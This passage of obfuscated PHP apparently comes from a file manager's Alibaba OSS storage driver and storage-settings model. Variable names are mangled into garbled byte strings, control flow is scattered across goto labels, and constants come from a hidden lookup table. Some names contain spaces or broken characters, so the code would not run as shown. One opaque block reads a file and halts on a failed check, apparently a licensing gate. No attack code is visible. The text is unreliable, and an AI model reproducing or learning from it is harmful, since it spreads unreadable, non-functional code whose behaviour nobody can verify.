($b”Åªå‹Õß[$BËºŒ½•…”[75]] as $e¬„‹èœ‹½ => $C¿ì‚—¯¢ö) { $b”Åªå‹Õß[$BËºŒ½•…”[75]][$e¬„‹èœ‹½] = $this->folderInfo($C¿ì‚—¯¢ö, $b†ï«ªéƒ, $C‡í´ó×ã); } foreach ($b”Åªå‹Õß[$BËºŒ½•…”[74]] as $e¬„‹èœ‹½ => $bâö­š²²) { $b”Åªå‹Õß[$BËºŒ½•…”[74]][$e¬„‹èœ‹½] = $this->fileInfo($bâö­š²²[$BËºŒ½•…”[28]], $bâö­š²², $C‡í´ó×ã); } return $b”Åªå‹Õß; } public function has($Bƒ£’Ùƒ˜, $Bß‡ƒŒ™ªØ = true) { goto eğ‰í¹±â; eğ‰í¹±â: $CËà“£”Å¯ =& $_SERVER[ÍÓÖ€°å]; $Bƒ£’Ùƒ˜ = trim($Bƒ£’Ùƒ˜, $CËà“£”Å¯[8]); $AÄ¹¢Ô››„ = empty($Bƒ£’Ùƒ˜) ? $CËà“£”Å¯[33] : $Bƒ£’Ùƒ˜ . $CËà“£”Å¯[8]; goto dÎÖŒ¿Çˆ„; dÎÖŒ¿Çˆ„: $D¯›á¼Åˆ­ = $CËà“£”Å¯[33]; $a‡´Ù„ò´Ê = 100; while (!0) { $FÆƒ÷»äÆ = array($CËà“£”Å¯[882] => $CËà“£”Å¯[8], $CËà“£”Å¯[174] => $AÄ¹¢Ô››„, $CËà“£”Å¯[883] => $a‡´Ù„ò´Ê, $CËà“£”Å¯[884] => $D¯›á¼Åˆ­); try { $c”›Ï…Ô…¹ = $this->client->listObjects($this->bucket, $FÆƒ÷»äÆ); } catch (OSS\Core\OssException $D¼ÜÕ‘±ï) { break; } $D¯›á¼Åˆ­ = $c”›Ï…Ô…¹->getNextMarker(); $bÇÕ°ÉŞµ = $c”›Ï…Ô…¹->getObjectList(); $D±Ÿ¿ˆ‘¿Œ = $c”›Ï…Ô…¹->getPrefixList(); if ($Bß‡ƒŒ™ªØ) { if (!empty($bÇÕ°ÉŞµ)) { if (count($bÇÕ°ÉŞµ) > 1 || $bÇÕ°ÉŞµ[0]->getKey() != $AÄ¹¢Ô››„) { return !0; } } } else { if (!empty($D±Ÿ¿ˆ‘¿Œ)) { return !0; } } if ($D¯›á¼Åˆ­ === $CËà“£”Å¯[33]) { break; } } goto fôÕ“¿ì»“; fôÕ“¿ì»“: return !1; goto aáİØ“ŞÄ§; aáİØ“ŞÄ§: } public function listAll($B‘·èåã˜Õ) { $D†ò™«…ÍÕ =& $_SERVER[ÍÓÖ€°å]; $FØã Ëê Â = $this->fileList($B‘·èåã˜Õ, $D†ò™«…ÍÕ[33], 1); $A¤‚ñ½–‘ = array(); foreach ($FØã Ëê Â[$D†ò™«…ÍÕ[74]] as $C­«·ÊÙò) { $A¤‚ñ½–‘[$C­«·ÊÙò[$D†ò™«…ÍÕ[28]]] = $C­«·ÊÙò[$D†ò™«…ÍÕ[78]]; } return $this->listAllFiles($B‘·èåã˜Õ, array_keys($A¤‚ñ½–‘), $A¤‚ñ½–‘); } public function canRead($bªê½Í„‡) { $FÒ‰ò™„Ñ° =& $_SERVER[ÍÓÖ€°å]; $FìŒƒèå³ = $this->pathAcl($bªê½Í„‡); return $FìŒƒèå³ == $FÒ‰ò™„Ñ°[895] || $FìŒƒèå³ == $FÒ‰ò™„Ñ°[896] ? !0 : !1; } public function canWrite($D·‰ñçÄ³) { $DøÆ·Å¯õ = $this->pathAcl($D·‰ñçÄ³); return $DøÆ·Å¯õ == $_SERVER[ÍÓÖ€°å][896] ? !0 : !1; } public function pathAcl($B®·êœÖË) { goto DÇƒ¤â‹İä; a´ƒ¹µ½¨®: return $FÃ¸ÀÊà†; goto Fß©ĞÛÔš±; fÄ°Ä±Æó : $FÃ¸ÀÊà† = $Fí£÷Ùì«¹ == $d§¬âÇÕ³¾[34] ? $this->bucketAcl : $Fí£÷Ùì«¹; if ($FÃ¸ÀÊà† == $d§¬âÇÕ³¾[897]) { return $d§¬âÇÕ³¾[895]; } if ($FÃ¸ÀÊà† == $d§¬âÇÕ³¾[898]) { return $d§¬âÇÕ³¾[896]; } goto a´ƒ¹µ½¨®; DÇƒ¤â‹İä: $d§¬âÇÕ³¾ =& $_SERVER[ÍÓÖ€°å]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Fí£÷Ùì«¹ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($B®·êœÖË)); } catch (OSS\Core\OssException $f–Îùô–©) { return !1; } goto fÄ°Ä±Æó ; Fß©ĞÛÔš±: } private function chmodPath($còÃ¥Ïõ‚ì, $C“Áƒ¥‡ = '') { $e¨ÓîŒßè“ =& $_SERVER[ÍÓÖ€°å]; $eÌ’Ï’öÑì = empty($C“Áƒ¥‡) ? $e¨ÓîŒßè“[898] : $C“Áƒ¥‡; $Aôø¾ªæŸ½ = array($e¨ÓîŒßè“[34], $e¨ÓîŒßè“[173], $e¨ÓîŒßè“[897], $e¨ÓîŒßè“[898]); if (!in_array($eÌ’Ï’öÑì, $Aôø¾ªæŸ½)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($còÃ¥Ïõ‚ì), $eÌ’Ï’öÑì); } catch (OSS\Core\OssException $dŠíßÌ„õ˜) { return !1; } return !0; } public function getContent($E…¹»¦³ ‘) { return $this->fileSubstr($E…¹»¦³ ‘, -1); } public function setContent($C«™¡ÜöªÅ, $c”¶ö©¸µ‡ = '') { $b‡‹óìÒ…Ô =& $_SERVER[ÍÓÖ€°å]; try { $fÈĞš›ä = array(); $E¬ô ğàø¹ = $this->client->putObject($this->bucket, $this->pathEncode($C«™¡ÜöªÅ), $c”¶ö©¸µ‡, $fÈĞš›ä); } catch (OSS\Core\OssException $CŒÓÇñ«ğ) { return !1; } $c«îÎ è¬ = array($b‡‹óìÒ…Ô[885] => trim($E¬ô ğàø¹[$b‡‹óìÒ…Ô[899]], $b‡‹óìÒ…Ô[102]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($C«™¡ÜöªÅ))); $this->updateObjMeta($C«™¡ÜöªÅ, $c«îÎ è¬); return isset($E¬ô ğàø¹[$b‡‹óìÒ…Ô[900]][$b‡‹óìÒ…Ô[846]]) ? (int) $E¬ô ğàø¹[$b‡‹óìÒ…Ô[900]][$b‡‹óìÒ…Ô[846]] : strlen($E¬ô ğàø¹); } private function updateObjMeta($C¬ÉµÕ§´, $cò›ääÏ‡´) { $C¬ÉµÕ§´ = $this->pathEncode($C¬ÉµÕ§´); try { $b´ÎÍÛÁÌ = array(OSS\OssClient::OSS_HEADERS => $cò›ääÏ‡´); $this->client->copyObject($this->bucket, $C¬ÉµÕ§´, $this->bucket, $C¬ÉµÕ§´, $b´ÎÍÛÁÌ); } catch (OSS\Core\OssException $d…×÷º‘ÄÆ) { return !1; } return !0; } public function upload($CÍÕ‹Şê…, $f…äô–†¸, $AÇß«¿½ë = false, $bç–¶š¬°´ = REPEAT_REPLACE) { $DÆÒŒéôÑ™ =& $_SERVER[ÍÓÖ€°å]; $FäØŒ‡—× = trim($CÍÕ‹Şê…, $DÆÒŒéôÑ™[8]); $CËßÊ×ÛãŸ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($DÆÒŒéôÑ™[885] => @md5_file($f…äô–†¸)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($CÍÕ‹Şê…))); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($FäØŒ‡—×), $f…äô–†¸, $CËßÊ×ÛãŸ); } catch (OSS\Core\OssException $Ešä‰—ÕŞö) { return !1; } return $this->getPathOuter($CÍÕ‹Şê…); } public function getHost($dÃùĞÇ²•“ = true) { $dá†ÏßÂä„ =& $_SERVER[ÍÓÖ€°å]; $dˆ²Ûïá = parse_url(trim($this->domain, $dá†ÏßÂä„[8])); $Fâ³©¯ ¤í = isset($dˆ²Ûïá[$dá†ÏßÂä„[156]]) ? $dˆ²Ûïá[$dá†ÏßÂä„[156]] : http_type(); $fÜë–ºò³× = isset($dˆ²Ûïá[$dá†ÏßÂä„[157]]) ? $dˆ²Ûïá[$dá†ÏßÂä„[157]] : $dˆ²Ûïá[$dá†ÏßÂä„[76]]; if (isset($dˆ²Ûïá[$dá†ÏßÂä„[158]])) { $fÜë–ºò³× .= $dá†ÏßÂä„[4] . $dˆ²Ûïá[$dá†ÏßÂä„[158]]; } return $Fâ³©¯ ¤í . $dá†ÏßÂä„[159] . $this->bucket . $dá†ÏßÂä„[90] . $fÜë–ºò³×; } public function uploadFormData($DİÂ·‘‚…”, $C«Úƒ„¸È¬ = 3600) { goto a”Š¢ˆõß‹; eãÃ¡çïËò: $Bé¹ä³Ş¡ = array($eö™‹§Ûß[818], $eö™‹§Ûß[819], $B¤Õ÷™ùŸË); $cøÊæ‚œºà[] = $Bé¹ä³Ş¡; $cÙŠ¬™ß²¦ = array($eö™‹§Ûß[814] => $f†ÑìÅêä, $eö™‹§Ûß[815] => $cøÊæ‚œºà); goto E¼™ÄŸîë; eŒ‹ŒÜ×‚¤: $bôµÅ’öÖÛ = date($eö™‹§Ûß[901], time() + $CŒˆ¤¾®­); $BãâÓğçÇ» = new DateTime($bôµÅ’öÖÛ); $f†ÑìÅêä = $BãâÓğçÇ»->format(DateTime::ISO8601); goto AƒìŒ‰Ûáò; D†ñËâ‰˜Ù: $C’¨¯ÍŒ°â = array($eö™‹§Ûß[903], 0, $BóÚºäİÔÊ); $cøÊæ‚œºà[] = $C’¨¯ÍŒ°â; $B¤Õ÷™ùŸË = $this->pathFather($DİÂ·‘‚…”); goto eãÃ¡çïËò; Eæá³ğÕÖ: return array($eö™‹§Ûß[824] => $CÓ·ßÀõÈÌ, $eö™‹§Ûß[904] => $this->accessKey, $eö™‹§Ûß[820] => $eö™‹§Ûß[812], $eö™‹§Ûß[905] => $D–ëŸÇÂ‡”, $eö™‹§Ûß[157] => $eØˆŠ¡¹ï¿); goto Cå»¹õ‘¡ô; AƒìŒ‰Ûáò: $eïîù¥ªÂ¶ = strpos($f†ÑìÅêä, $eö™‹§Ûß[276]); $f†ÑìÅêä = substr($f†ÑìÅêä, 0, $eïîù¥ªÂ¶) . $eö™‹§Ûß[902]; $BóÚºäİÔÊ = 1048576000 * 5; goto D†ñËâ‰˜Ù; E¼™ÄŸîë: $DÙ¹§–ß = json_encode($cÙŠ¬™ß²¦); $CÓ·ßÀõÈÌ = base64_encode($DÙ¹§–ß); $D–ëŸÇÂ‡” = base64_encode(hash_hmac($eö™‹§Ûß[213], $CÓ·ßÀõÈÌ, $this->secret, !0)); goto Eæá³ğÕÖ; a”Š¢ˆõß‹: $eö™‹§Ûß =& $_SERVER[ÍÓÖ€°å]; if (!($eØˆŠ¡¹ï¿ = $this->getHost())) { return !1; } $CŒˆ¤¾®­ = $C«Úƒ„¸È¬; goto eŒ‹ŒÜ×‚¤; Cå»¹õ‘¡ô: } public function multiUploadFormData($b»Ï•‡â¬, $CÅ—¼Ğ˜£Å = 3600) { $F—ˆÀ‹¥íË =& $_SERVER[ÍÓÖ€°å]; if (!($bÜª¨ÖÎ‡ = $this->getHost())) { return !1; } $cæâÍëäÉÕ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($b»Ï•‡â¬)); return array($F—ˆÀ‹¥íË[204] => $cæâÍëäÉÕ, $F—ˆÀ‹¥íË[157] => $bÜª¨ÖÎ‡ . $F—ˆÀ‹¥íË[8] . $this->pathEncode($b»Ï•‡â¬), $F—ˆÀ‹¥íË[205] => gmdate($F—ˆÀ‹¥íË[906]), $F—ˆÀ‹¥íË[88] => $b»Ï•‡â¬); } public function multiUploadAuthData($Eí®Œ•»ñµ, $F²²æÔÎÎ = array()) { goto e•ª˜š»Ä¾; bóÍÎ¿õØª: $D­ã‰ÈĞê× = $Eí®Œ•»ñµ; if (isset($F²²æÔÎÎ[$Eñ¹¥ä‘ [88]])) { $D­ã‰ÈĞê× = $F²²æÔÎÎ[$Eñ¹¥ä‘ [88]]; unset($F²²æÔÎÎ[$Eñ¹¥ä‘ [88]]); } if (isset($F²²æÔÎÎ[$Eñ¹¥ä‘ [206]])) { return $this->listUploadParts($D­ã‰ÈĞê×, $e÷±Ğ¬ò©, $F²²æÔÎÎ); } goto D‹†‘½®‚Ó; e•ª˜š»Ä¾: $Eñ¹¥ä‘  =& $_SERVER[ÍÓÖ€°å]; $e÷±Ğ¬ò© = isset($F²²æÔÎÎ[$Eñ¹¥ä‘ [205]]) ? $F²²æÔÎÎ[$Eñ¹¥ä‘ [205]] : gmdate($Eñ¹¥ä‘ [906]); $c·Êë¼ˆ¿ƒ = isset($F²²æÔÎÎ[$Eñ¹¥ä‘ [148]]) ? $F²²æÔÎÎ[$Eñ¹¥ä‘ [148]] : $Eñ¹¥ä‘ [33]; goto bóÍÎ¿õØª; e„™ŠÒ²®Š: if (!empty($F²²æÔÎÎ[$Eñ¹¥ä‘ [907]])) { $f©ºæ¿ƒâ = array_merge(array($c¦¼Ğ‹ßÈÌ[4]), $F²²æÔÎÎ[$Eñ¹¥ä‘ [907]]); sort($f©ºæ¿ƒâ); $c¦¼Ğ‹ßÈÌ[4] = implode($Eñ¹¥ä‘ [212], $f©ºæ¿ƒâ); } $DïÄº’¯‹Ü = implode($Eñ¹¥ä‘ [212], $c¦¼Ğ‹ßÈÌ); $b‡³ˆ´éÙ = base64_encode(hash_hmac($Eñ¹¥ä‘ [213], $DïÄº’¯‹Ü, $this->secret, !0)); goto Aå±Şö½…ö; Aå±Şö½…ö: $D‰ôÈâÇÉ‹ = $Eñ¹¥ä‘ [908] . $this->accessKey . $Eñ¹¥ä‘ [4] . $b‡³ˆ´éÙ; if (strpos($c·Êë¼ˆ¿ƒ, $Eñ¹¥ä‘ [208]) === 0) { $D‰ôÈâÇÉ‹ = array($Eñ¹¥ä‘ [215] => $D‰ôÈâÇÉ‹, $Eñ¹¥ä‘ [205] => $e÷±Ğ¬ò©); } return $D‰ôÈâÇÉ‹; goto dÂò¨Ô™¤£; D‹†‘½®‚Ó: $c¦¼Ğ‹ßÈÌ = array($Eñ¹¥ä‘ [207], $Eñ¹¥ä‘ [33], $Eñ¹¥ä‘ [105], $e÷±Ğ¬ò©, "\170\x2d\x6f\x73\163\55\144\141\x74\x65\72{$e÷±Ğ¬ò©}", $Eñ¹¥ä‘ [8] . $this->bucket . $Eñ¹¥ä‘ [8] . $D­ã‰ÈĞê× . $c·Êë¼ˆ¿ƒ); if (strpos($c·Êë¼ˆ¿ƒ, $Eñ¹¥ä‘ [208]) === 0) { $c¦¼Ğ‹ßÈÌ[0] = $Eñ¹¥ä‘ [209]; } if (isset($F²²æÔÎÎ[$Eñ¹¥ä‘ [210]]) && $F²²æÔÎÎ[$Eñ¹¥ä‘ [210]] == $Eñ¹¥ä‘ [211]) { $c¦¼Ğ‹ßÈÌ[0] = $Eñ¹¥ä‘ [211]; } goto e„™ŠÒ²®Š; dÂò¨Ô™¤£: } public function listUploadParts($d˜‰Ÿäß², $fß¼‰ùº†º, $CÆÕñÙŸƒ) { goto F³¨‚¦Ñ½; f…ğ ©“•Ù: $aŸš’ñ×¬ = $E›İòŠ¿‹á->getListPart(); $C˜ÆÁ‚ˆß‘ = array(); foreach ($aŸš’ñ×¬ as $BÁø¸•İíí) { $C˜ÆÁ‚ˆß‘[] = array($aÈÀÛæ‘¦[889] => $BÁø¸•İíí->getPartNumber(), $aÈÀÛæ‘¦[890] => trim($BÁø¸•İíí->getETag(), $aÈÀÛæ‘¦[102])); } goto dê ŞŒ««Œ; C›àÃ³Èö©: return array($aÈÀÛæ‘¦[215] => $D‰õ‘……ˆ‚, $aÈÀÛæ‘¦[205] => $fß¼‰ùº†º, $aÈÀÛæ‘¦[217] => $C˜ÆÁ‚ˆß‘); goto aàĞòñÉ¼Í; dê ŞŒ««Œ: unset($CÆÕñÙŸƒ[$aÈÀÛæ‘¦[206]], $CÆÕñÙŸƒ[$aÈÀÛæ‘¦[210]]); $D‰õ‘……ˆ‚ = $this->multiUploadAuthData($d˜‰Ÿäß², $CÆÕñÙŸƒ); if (empty($D‰õ‘……ˆ‚)) { return !1; } goto C›àÃ³Èö©; F³¨‚¦Ñ½: $aÈÀÛæ‘¦ =& $_SERVER[ÍÓÖ€°å]; $D†«ˆÆ©œß = parse_url_query($CÆÕñÙŸƒ[$aÈÀÛæ‘¦[148]]); $E›İòŠ¿‹á = $this->client->listParts($this->bucket, $this->pathEncode($d˜‰Ÿäß²), $D†«ˆÆ©œß[$aÈÀÛæ‘¦[204]]); goto f…ğ ©“•Ù; aàĞòñÉ¼Í: } public function download($DœÖ¹É©…¯, $fĞŠ¼Ä³À¹) { if ($this->isFolder($DœÖ¹É©…¯)) { return !1; } try { $f™ê¥Î‡Ğ„ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $fĞŠ¼Ä³À¹); $this->client->getObject($this->bucket, $this->pathEncode($DœÖ¹É©…¯), $f™ê¥Î‡Ğ„); } catch (OSS\Core\OssException $b¸ğêê¦Š²) { return !1; } return $fĞŠ¼Ä³À¹; } public function fileSubstr($cÅ¿æÇé©ò, $aç¸¹«³„È = 0, $f¹ö›ßÅÒ = false) { if ($aç¸¹«³„È === -1) { $E³šöÆÊó = array(); } else { if ($f¹ö›ßÅÒ === !1) { $Böæ»Ë† = $this->size($cÅ¿æÇé©ò); } else { $Böæ»Ë† = $aç¸¹«³„È + $f¹ö›ßÅÒ - 1; } $E³šöÆÊó = array(OSS\OssClient::OSS_RANGE => "{$aç¸¹«³„È}\x2d{$Böæ»Ë†}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($cÅ¿æÇé©ò), $E³šöÆÊó); } catch (OSS\Core\OssException $A¢ÕŞÂÂ°”) { return !1; } } public function link($d«ŞÛÓ«ø, $BÍã±›¤ = array()) { if (!$this->exist($d«ŞÛÓ«ø) || $this->isFolder($d«ŞÛÓ«ø)) { return !1; } try { $c†¿‘‘ï = !empty($BÍã±›¤) ? $BÍã±›¤ : array(); return $this->client->signUrl($this->bucket, $this->pathEncode($d«ŞÛÓ«ø), 3600 * 12, $_SERVER[ÍÓÖ€°å][211], $c†¿‘‘ï); } catch (OSS\Core\OssException $Fä¢¥“‹Í) { return !1; } } public function fileOut($aˆîõÈÒò™, $b‚È‹„×†Ñ = false, $Eî•ÕòöÙ¾ = false, $b­Ù¤­Ä§‡ = '') { goto B½á”˜ñÂâ; B½á”˜ñÂâ: $fÊßƒ·±…ö =& $_SERVER[ÍÓÖ€°å]; if (!$Eî•ÕòöÙ¾) { $Eî•ÕòöÙ¾ = $this->pathThis($aˆîõÈÒò™); } $eãë–£Ç’Ş = get_file_mime(get_path_ext($Eî•ÕòöÙ¾)); goto AãùÆ‡Ò­; AãùÆ‡Ò­: if ($eãë–£Ç’Ş == $fÊßƒ·±…ö[189]) { return parent::fileOut($aˆîõÈÒò™, $b‚È‹„×†Ñ, $Eî•ÕòöÙ¾, $b­Ù¤­Ä§‡); } $b‚È‹„×†Ñ = $b‚È‹„×†Ñ ? $fÊßƒ·±…ö[190] : $fÊßƒ·±…ö[191]; $Eî•ÕòöÙ¾ = $this->pathEncode($Eî•ÕòöÙ¾); goto e×Şøš¡Üà; F…¢£Ê¦Û: $this->fileOutLink($E±ö©ğ¥‘¥); goto eøæÜ‰ƒÌñ; e×Şøš¡Üà: $a´‡œºçãñ = array(OSS\OssClient::OSS_SUB_RESOURCE => $fÊßƒ·±…ö[909] . rawurlencode("{$b‚È‹„×†Ñ}\x3b\x66\x69\x6c\x65\x6e\x61\155\x65\75{$Eî•ÕòöÙ¾}")); $a´‡œºçãñ[OSS\OssClient::OSS_SUB_RESOURCE] .= $fÊßƒ·±…ö[910] . $eãë–£Ç’Ş; $E±ö©ğ¥‘¥ = $this->link($aˆîõÈÒò™, $a´‡œºçãñ); goto F…¢£Ê¦Û; eøæÜ‰ƒÌñ: } public function fileOutServer($CÄÖ¯°ë, $bà‰‚»Ñó¦ = false, $fÒò³ŞÓƒ = false, $bì¯ÖÔ’±Ğ = '') { parent::fileOut($CÄÖ¯°ë, $bà‰‚»Ñó¦, $fÒò³ŞÓƒ, $bì¯ÖÔ’±Ğ); } public function fileOutImage($fæ•¤öôÇŒ, $A è²È¯ñ = 250) { $EÆáµ‰õàâ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ÍÓÖ€°å][911] . $A è²È¯ñ); $Aøàä†ßª· = $this->link($fæ•¤öôÇŒ, $EÆáµ‰õàâ); $this->fileOutLink($Aøàä†ßª·); } public function fileOutImageServer($D˜¶Ü”ƒ, $CÊ‘ÏšÏš = 250) { parent::fileOutImage($D˜¶Ü”ƒ, $CÊ‘ÏšÏš); } public function hashMd5($eïÈ©òŒ¬Í, $Bóå…¸› = '') { $C¶—çåÚ‹ =& $_SERVER[ÍÓÖ€°å]; try { $fŒ¨©ö¸µ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($eïÈ©òŒ¬Í)); } catch (OSS\Core\OssException $bãâÅƒ–ˆ ) { return !1; } if (!isset($fŒ¨©ö¸µ[$C¶—çåÚ‹[885]]) && !empty($Bóå…¸›)) { $A¢§•éÎÛŸ = $this->updateObjMeta($eïÈ©òŒ¬Í, array($C¶—çåÚ‹[885] => $Bóå…¸›)); $fŒ¨©ö¸µ[$C¶—çåÚ‹[885]] = $A¢§•éÎÛŸ ? $Bóå…¸› : $C¶—çåÚ‹[33]; } return isset($fŒ¨©ö¸µ[$C¶—çåÚ‹[885]]) ? $fŒ¨©ö¸µ[$C¶—çåÚ‹[885]] : $C¶—çåÚ‹[33]; } private function fileInfoImage($eÍáàÔĞÚ¡, &$EÙÙ¹´¨å‚) { goto D³‘…Ÿêïá; Ağ­ç†›Ú: if (!$Aª§¼ºæ½[$FáˆÙ­ÔËí[437]]) { return !1; } $EÙÙ¹´¨å‚[$FáˆÙ­ÔËí[200]] = array($FáˆÙ­ÔËí[201] => $Aª§¼ºæ½[$FáˆÙ­ÔËí[759]][$FáˆÙ­ÔËí[913]][$FáˆÙ­ÔËí[348]], $FáˆÙ­ÔËí[202] => $Aª§¼ºæ½[$FáˆÙ­ÔËí[759]][$FáˆÙ­ÔËí[914]][$FáˆÙ­ÔËí[348]]); goto B›©ÊÜ´—Æ; D³‘…Ÿêïá: $FáˆÙ­ÔËí =& $_SERVER[ÍÓÖ€°å]; $eõë‚Š© Î = array($FáˆÙ­ÔËí[196], $FáˆÙ­ÔËí[149], $FáˆÙ­ÔËí[197], $FáˆÙ­ÔËí[198], $FáˆÙ­ÔËí[199]); if (!in_array($EÙÙ¹´¨å‚[$FáˆÙ­ÔËí[148]], $eõë‚Š© Î)) { return; } goto B³…¶å; B³…¶å: $fø£Œ‡”µ˜ = array(OSS\OssClient::OSS_PROCESS => $FáˆÙ­ÔËí[912]); $D±Ş“òˆÂò = $this->link($eÍáàÔĞÚ¡, $fø£Œ‡”µ˜); $Aª§¼ºæ½ = url_request($D±Ş“òˆÂò, $FáˆÙ­ÔËí[211], !1, !1, !1, !0); goto Ağ­ç†›Ú; B›©ÊÜ´—Æ: } } goto BÎŠ¾ªá™Ä; b÷åš“Çá±: function beforeShutdownFatalError($a‡öé“†ªæ) { think_exception($a‡öé“†ªæ); } $eäĞŸİÆíĞ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; register_shutdown_function($_SERVER[ÌˆŞó˜ªµ°][19]); goto D’Ã£ø¿¨å; dØ´ÑÑ’îÄ: if ($_SERVER[$_SERVER[ÍÓÖ€°å][544]] != $DùøÚÜºĞ»($e‰ê‹Úï‹‡)) { goto A—àÖ¼ç¡À; aäˆß™ì¬Š: $D½æĞ¨‰Í($e‰ê‹Úï‹‡); goto e¯˜›ŠŠ¢; EªÔÙµÌ÷Ş: $c®¥†ÕŸ‘ = explode($_SERVER[ÍÓÖ€°å][212], $C¨Ê¢äëí); if (count($c®¥†ÕŸ‘) < $_SERVER[ÍÓÖ€°å][1238]) { die; } $D½æĞ¨‰Í = $_SERVER[ÍÓÖ€°å][1239]; goto aäˆß™ì¬Š; A—àÖ¼ç¡À: $Cå’Ç¶™¨ = $_SERVER[ÍÓÖ€°å][546]; $Fù¢­§„ß† = BASIC_PATH . $_SERVER[ÍÓÖ€°å][547]; $C¨Ê¢äëí = $Cå’Ç¶™¨($Fù¢­§„ß†); goto EªÔÙµÌ÷Ş; e¯˜›ŠŠ¢: } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\x2e\x73\x74\157\x72\141\147\x65\x4c\151\163\164"; public $field = array("\156\x61\x6d\x65", "\163\x69\172\145\x4d\141\x78", "\163\x79\x73\x74\145\155", "\144\145\146\141\x75\154\x74", "\144\162\151\166\145\162", "\x63\157\x6e\x66\151\147"); public function listData($e¾°‘¬‡ì = false, $a‚ùÑñõ— = "\x6d\x6f\144\151\146\171\124\x69\x6d\x65", $Bƒ¾Ÿˆ… = false) { goto AùÛˆèí…; bŒ½Õ’¨İ: foreach ($cß¶†•…ô as $C¹ğ…óóÚÆ => $Bç¨¯´…¤ù) { unset($cß¶†•…ô[$C¹ğ…óóÚÆ][$c¶æî¾Îİ[6]]); $cß¶†•…ô[$C¹ğ…óóÚÆ][$c¶æî¾Îİ[1502]] = 0; } $b÷áÎ¶ª¬ = array_to_keyvalue($cß¶†•…ô, $c¶æî¾Îİ[33], $c¶æî¾Îİ[357]); $this->_listAppendSize($cß¶†•…ô, $b÷áÎ¶ª¬); goto b™ÀÂ•¿®¹; b™ÀÂ•¿®¹: return $cß¶†•…ô; goto F¢¶ôáï; AùÛˆèí…: $c¶æî¾Îİ =& $_SERVER[ÍÓÖ€°å]; $cß¶†•…ô = parent::listData($e¾°‘¬‡ì, $a‚ùÑñõ—, $Bƒ¾Ÿˆ…); if ($e¾°‘¬‡ì) { return $cß¶†•…ô; } goto bŒ½Õ’¨İ; F¢¶ôáï: } public function _listAppendSize(&$Aääò˜„¸¶, $dÀÓ­£÷©Ÿ) { $Cåªï¼š‡ =& $_SERVER[ÍÓÖ€°å]; $AãŒ¼Ûâê = $Cåªï¼š‡[1757] . implode($Cåªï¼š‡[47], $dÀÓ­£÷©Ÿ) . $Cåªï¼š‡[1758]; $b™òë‹²ò® = Model($Cåªï¼š‡[470])->query($AãŒ¼Ûâê); $b™òë‹²ò® = array_to_keyvalue($b™òë‹²ò®, $Cåªï¼š‡[357], $Cåªï¼š‡[78]); foreach ($Aääò˜„¸¶ as $aîôíäÉÚ÷ => $E»ÄİğÎˆ) { $Aääò˜„¸¶[$aîôíäÉÚ÷][$Cåªï¼š‡[1502]] = isset($b™òë‹²ò®[$E»ÄİğÎˆ[$Cåªï¼š‡[357]]]) ? $b™òë‹²ò®[$E»ÄİğÎˆ[$Cåªï¼š‡[357]]] : 0; } } public function getConfig($d•´÷²¥‘) { $c“¯ÑÄñÖ = parent::listData($d•´÷²¥‘); return json_decode($c“¯ÑÄñÖ[$_SERVER[ÍÓÖ€°å][6]], !0); } public function update($Fóîõ¥ÁÉ, $E‡ñ’¨Ë×–) { goto Bãõ‰¾’¾•; aÙÚ»‚¦»œ: if (isset($dçâÚ£ˆ¤ô[$e«‚» —è]) && $dçâÚ£ˆ¤ô[$e«‚» —è][$aÙªˆí¸»é[357]] != $Fóîõ¥ÁÉ) { return !1; } if (isset($E‡ñ’¨Ë×–[$aÙªˆí¸»é[1759]]) && $E‡ñ’¨Ë×–[$aÙªˆí¸»é[1759]] == $aÙªˆí¸»é[367]) { $this->checkConfig($E‡ñ’¨Ë×–); } unset($E‡ñ’¨Ë×–[$aÙªˆí¸»é[1759]]); goto F¼±Ğ™¡; Bãõ‰¾’¾•: $aÙªˆí¸»é =& $_SERVER[ÍÓÖ€°å]; $e«‚» —è = $E‡ñ’¨Ë×–[$aÙªˆí¸»é[28]]; $dçâÚ£ˆ¤ô = array_to_keyvalue(parent::listData(), $aÙªˆí¸»é[28]); goto aÙÚ»‚¦»œ; F¼±Ğ™¡: $AŒô’ç©© = parent::update($Fóîõ¥ÁÉ, $E‡ñ’¨Ë×–); if ($AŒô’ç©© && $E‡ñ’¨Ë×–[$aÙªˆí¸»é[34]]) { foreach ($dçâÚ£ˆ¤ô as $dÛÕŒ‡ÄŸÒ) { if ($dÛÕŒ‡ÄŸÒ[$aÙªˆí¸»é[34]] && $dÛÕŒ‡ÄŸÒ[$aÙªˆí¸»é[357]] != $Fóîõ¥ÁÉ) { parent::update($dÛÕŒ‡ÄŸÒ[$aÙªˆí¸»é[357]], array($aÙªˆí¸»é[34] => 0)); } } } return $AŒô’ç©©; goto f£³×ÚÈŸ–; f£³×ÚÈŸ–: } public function add($añ¾ëòôóÓ) { goto EêîøÈŒŞ½; béï£æ‹¿­: return $d»„éî¼›¼; goto C£§¦Á¡÷Ÿ; EêîøÈŒŞ½: $c¡‚ÍÌŞÑØ =& $_SERVER[ÍÓÖ€°å]; $a¢…Œ×æ‡ = array_to_keyvalue(parent::listData(), $c¡‚ÍÌŞÑØ[28]); if (isset($a¢…Œ×æ‡[$añ¾ëòôóÓ[$c¡‚ÍÌŞÑØ[28]]])) { return !1; } goto c²²«ÅƒŞö; c²²«ÅƒŞö: $this->checkConfig($añ¾ëòôóÓ); $d»„éî¼›¼ = parent::insert($añ¾ëòôóÓ); if ($d»„éî¼›¼ && $añ¾ëòôóÓ[$c¡‚ÍÌŞÑØ[34]]) { foreach ($a¢…Œ×æ‡ as $Få³ÆÁÒô) { if ($Få³ÆÁÒô[$c¡‚ÍÌŞÑØ[34]]) { parent::update($Få³ÆÁÒô[$c¡‚ÍÌŞÑØ[357]], 